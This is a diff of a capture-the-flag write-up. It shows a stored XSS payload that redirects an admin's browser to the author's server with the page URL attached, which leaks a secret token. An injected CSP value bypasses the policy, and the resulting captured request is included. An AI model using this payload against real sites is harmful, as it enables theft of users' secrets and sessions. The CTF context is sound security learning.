@@ -33,7 +33,7 @@ Upgrade-Insecure-Requests: 1
 
 title=<script>document.location = 'http://myserver.local/?' + document.URL;</script>&pictureSrc=https://i.imgur.com/SW3HsEm.png; script-src 'unsafe-inline'
 ```
-XSS was finally triggered. I reported that post to the admin and after few seconds I've got that request
+XSS was finally triggered. During CTF I used XSS hunter for the payload since I didn't knew what or where to look for the flag, but here I posted more direct solution that will send whole URL. I reported that post to the admin and after few seconds I've got that request
 ```
 GET /?http://ctf.kaf.sh:3030/post/5?secret=7NKuGbDnFEWijCXtmPpTQVegzk95yRS6 HTTP/1.1
 Host: myserver.local
